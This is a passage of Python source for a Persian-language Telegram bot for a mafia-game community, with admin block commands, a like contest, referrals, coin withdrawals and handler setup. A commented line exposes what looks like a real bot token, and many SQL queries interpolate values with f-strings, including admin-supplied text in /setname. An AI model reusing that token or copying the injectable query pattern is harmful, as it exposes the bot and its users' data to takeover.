        await context.bot.send_message(chat_id="5469541693", text=f'✅کاربر {player} از بلاکی خارج شد')
        await context.bot.send_message(chat_id="5571950188", text=f'✅کاربر {player} از بلاکی خارج شد')
    return ConversationHandler.END



async def cancadmB(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END





conv_handler8 = ConversationHandler(
    entry_points=[CommandHandler('blockuser', shoroB)],
    states={
        ESMADMB: [MessageHandler(filters.TEXT & ~filters.COMMAND , haleadmB)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cancadmB)]
    },
    fallbacks=[CommandHandler('cancel', cancadmB)],
    conversation_timeout= 120
)



ESMADMB2 = 1

async def shoroB2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":

        await update.message.reply_text('کیو میخوای بلاک دو کنی؟')
        return ESMADMB2
    else:
        return ConversationHandler.END


async def haleadmB2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    ff = c.execute("SELECT admin_block2 FROM users WHERE Khas = ?", (player,))
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        c.execute(f"UPDATE users SET admin_block2='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='⛔️کاربر بلاک شد')
    elif ff == 0:
        c.execute(f"UPDATE users SET admin_block2='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='⛔️کاربر بلاک شد')
    elif ff == 1:
        c.execute(f"UPDATE users SET admin_block2='{0}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅کاربر از بلاکی خارج شد')
    return ConversationHandler.END



async def cancadmB2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END





conv_handler14 = ConversationHandler(
    entry_points=[CommandHandler('blockuser2', shoroB2)],
    states={
        ESMADMB2: [MessageHandler(filters.TEXT & ~filters.COMMAND , haleadmB2)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cancadmB2)]
    },
    fallbacks=[CommandHandler('cancel', cancadmB2)],
    conversation_timeout= 120
)




ROBAN = 1

async def roban1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":

        await update.message.reply_text('کیو میخوای از ارسال پیام همگانی آزاد کنی؟')
        return ROBAN
    else:
        return ConversationHandler.END


async def roban2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    ff = c.execute("SELECT roban FROM users WHERE Khas = ?", (player,))
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        c.execute(f"UPDATE users SET roban='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅آزاد شد')
    elif ff == 0:
        c.execute(f"UPDATE users SET roban='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅آزاد شد')
    elif ff == 1:
        c.execute(f"UPDATE users SET roban='{0}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='❌محدود شد')
    return ConversationHandler.END



async def cancroban(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END





conv_handler27 = ConversationHandler(
    entry_points=[CommandHandler('roban', roban1)],
    states={
        ROBAN: [MessageHandler(filters.TEXT & ~filters.COMMAND , roban2)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cancroban)]
    },
    fallbacks=[CommandHandler('cancel', cancroban)],
    conversation_timeout= 120
)





MYUSER = 1

async def myuser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    if rr == "5469541693":

        await update.message.reply_text('کیو میخوای مال خودت کنی؟')
        return MYUSER
    else:
        return ConversationHandler.END


async def myuser2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    ff = c.execute("SELECT myuser FROM users WHERE Khas = ?", (player,))
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        c.execute(f"UPDATE users SET myuser='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅کاربر مال خودت شد')
    elif ff == 0:
        c.execute(f"UPDATE users SET myuser='{1}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='✅کاربر مال خودت شد')
    elif ff == 1:
        c.execute(f"UPDATE users SET myuser='{0}' WHERE Khas = ?", (player,))
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='دیگه کاربر مال خودت نیس')
    return ConversationHandler.END



async def cancmyuser(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏠از قسمت ارسال پیام به پلیر خارج شدید")
    return ConversationHandler.END





conv_handler26 = ConversationHandler(
    entry_points=[CommandHandler('myuser', myuser)],
    states={
        MYUSER: [MessageHandler(filters.TEXT & ~filters.COMMAND , myuser2)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, cancmyuser)]
    },
    fallbacks=[CommandHandler('cancel', cancmyuser)],
    conversation_timeout= 120
)






KIKI = 1
async def bardasht1(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    po = c.execute(f"SELECT onebar FROM users WHERE user_id={update.effective_chat.id}")
    po = c.fetchone()
    po = po[0]
    user_id = update.effective_chat.id
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=update.effective_chat.id, text='❌روزی یک بار میتونید درخواست برداشت بزنید')
        return ConversationHandler.END
    # await update.message.reply_text('💰چند سکه میخوای برداشت کنی؟', reply_markup=reply)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='💰چند سکه میخوای برداشت کنی؟\n\nتوجه: روزی یک بار میتونی درخواست برداشت بزنی', reply_markup=reply)
    return KIKI

async def bardasht2(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    tt = update.message.text
    user_id = update.effective_chat.id
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    answer1 = f"ii {user_id}"
    button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
    keyboard2 = InlineKeyboardMarkup([[button2]])
    if tt.isdigit():
        if float(tt) < 25:
            await update.message.reply_text('❌حداقل برداشت 25 سکه است')
            return
        else:
            vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
            vv = c.fetchone()
            vv = vv[0]
            if float(tt) > float(vv):
                await update.message.reply_text('❌عدم موجودی کافی')
                return
            kk = float(vv) - float(tt)
            c.execute(f'UPDATE users SET coin={kk} WHERE user_id={user_id}')
            conn.commit()
            await context.bot.send_message(chat_id="5469541693", text=f'''💰درخواست برداشت سکه
    {uu}{fff}
    {user_id}
    {tt} سکه''', reply_markup=keyboard2)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f'درخواست کوپن {int(tt)} سکه‌ای برای ادمین ارسال شد✅', reply_markup=reply_markup)
            today = datetime.date.today()
            go = today.strftime('%d')
            c.execute(f"UPDATE users SET onebar='{go}' WHERE user_id = ?", (user_id,))
            conn.commit()
            return ConversationHandler.END

async def canc111111(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🏠صفحه اصلی", reply_markup=reply_markup)
    return ConversationHandler.END

conv_handler24 = ConversationHandler(
    entry_points=[CallbackQueryHandler(bardasht1, pattern=r'^s')],
    states={
        ESMADMB2: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$') , bardasht2),
                   MessageHandler(filters.Regex(r'^❌بازگشت$'), canc111111)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, canc111111)]
    },
    fallbacks=[CommandHandler('cancel', canc111111)],
    conversation_timeout= 120
)




# c.execute(f"UPDATE users SET rozja={10} WHERE user_id={"5469541693"}")
# conn.commit()


LIKE = 1

async def shorolike(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await context.bot.send_message(chat_id=user_id, text='❌مسابقه غیر فعال است')
    return ConversationHandler.END
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                if chat_member.status in ['left', 'kicked']:
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    # words = update.message.text
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای ارسال پیام ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END
    global keyboard
    # c.execute(f"UPDATE users SET oneper={'(null)'} WHERE user_id={user_id}")
    # conn.commit()
    # c.execute(f"UPDATE users SET kilike={'(null)'} WHERE user_id={user_id}")
    # conn.commit()
    vv = c.execute(f"SELECT oneper FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = '0'
    po = c.execute(f"SELECT rozja FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if po == None:
        po = tt
    if str(po) != str(tt):
        c.execute(f"UPDATE users SET oneper={'(null)'} WHERE user_id={user_id}")
        conn.commit()
        c.execute(f"UPDATE users SET kilike={'(null)'} WHERE user_id={user_id}")
        conn.commit()
        vv = c.execute(f"SELECT oneper FROM users WHERE user_id={user_id}")
        vv = c.fetchone()
        vv = vv[0]
    try:
        if vv.count(',') > 4:
            await update.message.reply_text('❌هر روز میتونید فقط 5 نفرو لایک کنید')
            return ConversationHandler.END
    except:
        pass
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    await update.message.reply_text('کد یا نام، کاربری که میخوای لایک کنی بفرست\n\n💰هر جمعه شب کسی که بیشترین لایکو داشته باشه 100 سکه جایزه میگیره\n\nلیست لایک ها👇\n/showlist\n\nلیست کد کاربران👇\n\n/show', reply_markup=reply)
    return LIKE


async def like(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    player = update.message.text
    user_id = update.effective_user.id
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    try:
        if player.isdigit():
            qe = c.execute("SELECT like FROM users WHERE id = ?", (player,))
            qe = c.fetchone()
            qe = qe[0]
            fgh = c.execute("SELECT oneper FROM users WHERE user_id = ?", (user_id,))
            fgh = c.fetchone()
            yt = c.execute("SELECT user_id FROM users WHERE id = ?", (player,))
            yt = c.fetchone()
            yt = yt[0]
            if yt == user_id:
                await update.message.reply_text('❌شما نمیتونید خودتونو لایک کنید', reply_markup=reply_markup)
                return ConversationHandler.END
            fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
            fff = c.fetchone()
            fff = fff[0]
            uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
            uu = c.fetchone()
            uu = uu[0]
            xw = c.execute(f"SELECT username FROM users WHERE user_id={user_id}")
            xw = c.fetchone()
            xw = xw[0]
            jf = c.execute(f"SELECT Khas FROM users WHERE user_id={yt}")
            jf = c.fetchone()
            jf = jf[0]
            ir = c.execute(f"SELECT username FROM users WHERE user_id={yt}")
            ir = c.fetchone()
            ir = ir[0]
            ur = c.execute(f"SELECT Lig FROM users WHERE user_id={yt}")
            ur = c.fetchone()
            ur = ur[0]
            try:
                if str(yt) in fgh[0]:
                    await update.message.reply_text('❌شما امروز این کاربر را لایک کرده‌اید', reply_markup=reply_markup)
                    return ConversationHandler.END
            except:
                pass
            fgh1 = c.execute("SELECT kilike FROM users WHERE user_id = ?", (user_id,))
            fgh1 = c.fetchone()
            try:
                if str(yt) in fgh1[0]:
                    await update.message.reply_text('❌نمیتونید امروز این کاربر را لایک کنید، چون امروز این کاربر شما را لایک کرده است', reply_markup=reply_markup)
                    return ConversationHandler.END
            except:
                pass
            if qe == None:
                qe = 0
            yy = int(qe) + 1
            c.execute(f"UPDATE users SET like={yy} WHERE id={player}")
            conn.commit()
            await context.bot.send_message(chat_id=yt, text=f'شما توسط [ {uu}{fff} ] لایک شدید ❤️\n\nمشاهده تعداد لایک های شما👇\n/profile\n\nلیست لایک ها👇\n/showlist')
            await context.bot.send_message(chat_id='5469541693', text=f'''❤️❤️❤️
                                        
    {uu}{fff}
    {user_id}
    @{xw}

    اینو کاربر را لایک کرد👇

    {ur}{jf}
    {yt}
    @{ir}''')
            c.execute(f"UPDATE users SET oneper=CONCAT(oneper, ',', {yt}) WHERE user_id={user_id}")
            conn.commit()
            c.execute(f"UPDATE users SET kilike=CONCAT(kilike, ',', {user_id}) WHERE user_id={yt}")
            conn.commit()
        else:
            qe = c.execute("SELECT like FROM users WHERE Khas = ?", (player,))
            qe = c.fetchone()
            qe = qe[0]
            fgh = c.execute("SELECT oneper FROM users WHERE user_id = ?", (user_id,))
            fgh = c.fetchone()
            yt = c.execute("SELECT user_id FROM users WHERE Khas = ?", (player,))
            yt = c.fetchone()
            yt = yt[0]
            if yt == user_id:
                await update.message.reply_text('❌شما نمیتونید خودتونو لایک کنید', reply_markup=reply_markup)
                return ConversationHandler.END
            fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
            fff = c.fetchone()
            fff = fff[0]
            uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
            uu = c.fetchone()
            uu = uu[0]
            xw = c.execute(f"SELECT username FROM users WHERE user_id={user_id}")
            xw = c.fetchone()
            xw = xw[0]
            jf = c.execute(f"SELECT Khas FROM users WHERE user_id={yt}")
            jf = c.fetchone()
            jf = jf[0]
            ir = c.execute(f"SELECT username FROM users WHERE user_id={yt}")
            ir = c.fetchone()
            ir = ir[0]
            ur = c.execute(f"SELECT Lig FROM users WHERE user_id={yt}")
            ur = c.fetchone()
            ur = ur[0]
            try:
                if str(yt) in fgh[0]:
                    await update.message.reply_text('❌شما امروز این کاربر را لایک کرده‌اید', reply_markup=reply_markup)
                    return ConversationHandler.END
            except:
                pass
            fgh1 = c.execute("SELECT kilike FROM users WHERE user_id = ?", (user_id,))
            fgh1 = c.fetchone()
            try:
                if str(yt) in fgh1[0]:
                    await update.message.reply_text('❌نمیتونید امروز این کاربر را لایک کنید، چون امروز این کاربر شما را لایک کرده است', reply_markup=reply_markup)
                    return ConversationHandler.END
            except:
                pass
            if qe == None:
                qe = 0
            yy = int(qe) + 1
            await context.bot.send_message(chat_id=yt, text=f'شما توسط [ {uu}{fff} ] لایک شدید ❤️\n\nمشاهده تعداد لایک های شما👇\n/profile\n\nلیست لایک ها👇\n/showlist')
            await context.bot.send_message(chat_id='5469541693', text=f'''❤️❤️❤️
                                        
    {uu}{fff}
    {user_id}
    @{xw}

    اینو کاربر را لایک کرد👇

    {ur}{jf}
    {yt}
    @{ir}''')
            c.execute(f"UPDATE users SET like={yy} WHERE Khas = ?", (player,))
            conn.commit()
            c.execute(f"UPDATE users SET oneper=CONCAT(oneper, ',', {yt}) WHERE user_id={user_id}")
            conn.commit()
            c.execute(f"UPDATE users SET kilike=CONCAT(kilike, ',', {user_id}) WHERE user_id={yt}")
            conn.commit()
        today = datetime.date.today()
        go = today.strftime('%d')
        c.execute(f"UPDATE users SET rozja='{go}' WHERE user_id = ?", (user_id,))
        conn.commit()
        await update.message.reply_text('✅کاربر با موفقیت لایک شد', reply_markup=reply_markup)
    except:
        await update.message.reply_text('❌همچنین کاربری وجود ندارد\nو یا اینکه رباتو بلاک کرده است', reply_markup=reply_markup)
    return ConversationHandler.END



async def canclike(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("🏠خارج شدید", reply_markup=reply_markup)
    return ConversationHandler.END





conv_handler23 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🏎 مسابقه$')), shorolike)],
    states={
        LIKE: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$') , like),
               MessageHandler(filters.Regex(r'^❌بازگشت$'), canclike)],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, canclike)]
    },
    fallbacks=[CommandHandler('cancel', canclike)],
    conversation_timeout= 120
)





async def refral(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    ix = c.execute(f"SELECT ONER FROM users WHERE user_id={user_id}")
    ix = c.fetchone()
    ix = ix[0]
    if ix == None:
        ix = 0
    if ff == None:
        await update.message.reply_text('''❌برای استفاده از این قابلیت شما باید نام شما ثبت شده باشه ولی شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return
    uu = c.execute(f"SELECT Referrals FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    try:
        uu = uu.count(',')
    except:
        uu = 0
    referral_link = f"https://t.me/sahere_bmola_bot?start={update.effective_user.id}"
    # await update.message.reply_text(f'{uu}\n\n{referral_link}')
    with open("DAVAT.jpg", "rb") as f:
        await context.bot.send_photo(chat_id=user_id, photo=f, caption=f"""🔱ربات ساحره🔱

ما یک ربات مخصوص مافیا پلیر های دُهات و مافیا طراحی کردیم

قابلیت های ربات👇

⭕️پیام خصوصی: تا حالا شده بخواید به کسی که قبلا تو بازی دیدید پیام بدید ولی آیدی تلگرامش رو نداشته باشید؟ از طریق این ربات میتونید بهش پیام ارسال کنید

⭕️پیام ناشناس: میتونید پیام ناشناس به پلیر های مافیا ارسال کنید ارسال کنید👽

⭕️پیام همگانی: پیام شما به صورت خودکار همراه با اسمتون داخل کانال فرستاده میشه و بقیه مافیا پلیر ها میتونن پیام شما رو ببینن

⭕️جایزه روزانه:هر روز میتونید یک بار شانستون رو در تاس، بولینگ، بسکتبال، فوتبال و دارت امتحان کنید و در صورت برنده شدن سکه مافیا جایزه میگیرید

⭕️کازینو: میتونید در بازی های تاس و بسکتبال شرط‌بندی کنید

در ضمن با دعوت کردن دوستاتون میتونید سکه دریافت کنید

آیدی ربات ساحره👇
{referral_link}""")
    ww = c.execute(f"SELECT etc FROM users WHERE user_id=6967243537")
    ww = c.fetchone()
    ww = ww[0]
#     await update.message.reply_text(f"""این بنر اختصاصی شماست👆

# هر کسی که با لینک اختصاصی شما وارد ربات بشه برای شما یک رفرال اضافه میشه و هر رفرال برابر است با {ww} سکه
# ⭕️نکته: وقتی کاربری با لینک دعوت شما وارد ربات میشه برای شما پیام ارسال میشه، و زمانی که اون کاربر ثبت نام کنه برای شما کوپن سکه ارسال میشه
# ⭕️نکته: کسایی که دعوت میکنید باید حداقل ۴۷۵۰ امتیاز داشته باشند یعنی حداقل این لیگ🎖
# """)
    await update.message.reply_text(f'🐡تعداد افرادی که تا الان با لینک شما وارد ربات شدن:\n{uu} نفر\n\n🐡تعداد افرادی که تا الان با لینک شما وارد ربات شدن و ثبت نام کردند:\n{ix} نفر')


# async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
#     if 'start' in update.message.text:
#         # لینک رفرال استفاده شده است
#         referrer_id = update.message.text.split()[1]
        
#         # ارسال پیام به ادمین
#         # await update.message.reply_text(f"کاربر جدید با لینک رفرال {referrer_id} وارد ربات شد.")
#         await context.bot.send_message(chat_id="5469541693", text=referrer_id)


async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    vw = c.execute(f"SELECT id FROM users WHERE user_id={user_id}")
    vw = c.fetchone()
    vw = vw[0]
    if vw == None:
        vw = 0
    answer1 = f"ss {user_id}"
    answer2 = f"cc {user_id}"
    button2 = InlineKeyboardButton("برداشت سکه", callback_data=answer1)
    button3 = InlineKeyboardButton("واریز سکه", callback_data=answer2)
    keyboard2 = InlineKeyboardMarkup([[button2, button3]])
    if vv == None:
        vv = 0
    await update.message.reply_text(f"""👤نام: {uu}{fff}

🆔آیدی عددی: {user_id}

💰سکه: {round(float(vv), 2)}

🔢 کد: {vw}""", reply_markup=keyboard2)

async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    # username = update.message.from_user.username
    answer1 = f"ii {user_id}"
    button2 = InlineKeyboardButton("پاسخ", callback_data=answer1)
    keyboard2 = InlineKeyboardMarkup([[button2]])
    fff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    fff = c.fetchone()
    fff = fff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    query = update.callback_query
    # query.answer()
    cdehh = query.data
    cdehh = cdehh.split()
    cdehh = cdehh[1]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if vv < 25:
        await query.answer('❌حداقل برداشت 25 سکه است', show_alert=True)
        # await context.bot.send_message(chat_id=user_id, text=)
    elif vv >= 25:
        await context.bot.send_message(chat_id="5469541693", text=f'''💰درخواست برداشت سکه
{uu}{fff}
{user_id}
{vv} سکه''', reply_markup=keyboard2)
        await context.bot.send_message(chat_id=user_id, text=f'درخواست کوپن {int(vv)} سکه‌ای برای ادمین ارسال شد✅')
        gg = float(vv) - int(vv)
        c.execute(f"UPDATE users SET coin={gg} WHERE user_id={user_id}")
        conn.commit()


async def setname(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    
    if rr == "5469541693":
        text = update.message.text
        text = text.replace("/setname ", "")
        

        parts = text.split(" ")
        
        if len(parts) >= 3:
            id = parts[0]
            lig = parts[1]
            name = " ".join(parts[2:])
            

            c.execute(f"UPDATE users SET Lig='{lig}' WHERE user_id={id}")
            conn.commit()
            c.execute(f"UPDATE users SET Khas='{name}' WHERE user_id={id}")
            conn.commit()
            
            await context.bot.send_message(chat_id=user_id, text='✅ اسم ثبت شد')
            await context.bot.send_message(chat_id=id, text=f'🈲اسم شما توسط ادمین تغییر کرد\n\nاسم شما: {lig}{name}')
        else:
            await context.bot.send_message(chat_id=user_id, text='❌ فرمت نامعتبر است. لطفا به شکل صحیح وارد کنید.')




async def resetsss(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    rr = str(user_id)
    
    if rr == "5469541693":
        import sowal
        sowal.sss = None
        await context.bot.send_message(chat_id=user_id, text='حله')




# app = ApplicationBuilder().token("7216952739:AAEupGEYaqKTspCqNznUwX__GjndwVOvICE").build()
app = ApplicationBuilder().token("YOUR-TELEGRAM-BOT-TOKEN").build()


app.add_handler(CommandHandler("start", start))
# app.add_handler(MessageHandler(filters.Dice.BASKETBALL, basss))
app.add_handler(conv_handler4)

app.add_handler(CommandHandler("sa", sa))
app.add_handler(CommandHandler("sa2", sa2))
app.add_handler(CommandHandler("seke", seke))
# app.add_handler(MessageHandler(filters.PHOTO, photoa))
app.add_handler(CommandHandler("sho", sho))
app.add_handler(CommandHandler("show", show))
app.add_handler(CommandHandler("showlist", showlist))
app.add_handler(CommandHandler("answer", answer2))
app.add_handler(CallbackQueryHandler(block_user, pattern=r'\d.*\b'))
app.add_handler(CallbackQueryHandler(annanimus, pattern=r'^a'))
app.add_handler(CallbackQueryHandler(tayid, pattern=r'^p'))
# app.add_handler(CallbackQueryHandler(pay, pattern=r'^s'))
# app.add_handler(CallbackQueryHandler(tas_e, pattern=r'^T'))
app.add_handler(CommandHandler("help", helpmsg))
app.add_handler(MessageHandler(filters.FORWARDED & filters.Regex(r'^\•'), Khas))
# app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\.'), tamir))
app.add_handler(CommandHandler("mohaqeq", mohaqeq))
app.add_handler(CommandHandler("saheregif", saheregif))
app.add_handler(CommandHandler("mohaqeqgif", mohaqeqgif))
app.add_handler(CommandHandler("saptnamgif", saptnamgif))
app.add_handler(CommandHandler("sendbazi", sendbazi))
app.add_handler(CommandHandler("msggif", msggif))
app.add_handler(CommandHandler("msgcodegif", msgcodegif))
app.add_handler(CommandHandler("cazino", cazino))
app.add_handler(CommandHandler("getcoin", getcoin))
app.add_handler(CommandHandler("saptdasti", saptdasti))
app.add_handler(CommandHandler("profile", profile))
# app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🤖قابلیت های دیگر🤖$')), help))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🪪 پروفایل$')), profile))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^📚 راهنما$')), helpmsg))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🏎 مسابقه$')), showlist))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🎁 دعوت دوستان$')), refral))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🎲 جایزه روزانه$')), key_daily))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🎰 کازینو$')), key_cazino))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🎮 بازی ها$')), bazii))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^🗂 تسک$')), key_task))
app.add_handler(MessageHandler(filters.Regex(re.compile(r'^بازگشت❌$')), exit))
app.add_handler(CommandHandler("refral", refral))
app.add_handler(CommandHandler("users", users))
app.add_handler(CommandHandler("resetlike", resetlike))
app.add_handler(CommandHandler("resetref", resetref))
app.add_handler(CommandHandler("nerkh", nerkh))
app.add_handler(CommandHandler("buray", buray))
app.add_handler(CommandHandler("sahih", sahih))
app.add_handler(CommandHandler("off", off))
app.add_handler(CommandHandler("resetsss", resetsss))
app.add_handler(CommandHandler("setname", setname))
app.add_handler(conv_handler2) #پیام به ادمین
app.add_handler(conv_handler5) #پاسخ
app.add_handler(conv_handler6) #پیام از ادمین
app.add_handler(conv_handler7) #پیام همگانی
app.add_handler(conv_handler8)
app.add_handler(conv_handler9)
app.add_handler(conv_handler10)
app.add_handler(conv_handler11)
# app.add_handler(conv_handler12)
# app.add_handler(conv_handler13)
app.add_handler(conv_handler14)
# app.add_handler(conv_handler15)
app.add_handler(conv_handler16)
app.add_handler(conv_handler17)
app.add_handler(conv_handler18)
app.add_handler(conv_handler19)
# app.add_handler(conv_handler20)
app.add_handler(conv_handler21)
app.add_handler(conv_handler22)
# app.add_handler(conv_handler23)
app.add_handler(conv_handler24)
app.add_handler(conv_handler25)
app.add_handler(conv_handler26)
app.add_handler(conv_handler27)
app.add_handler(conv_handler28)
app.add_handler(conv_handler3)


app.run_polling()
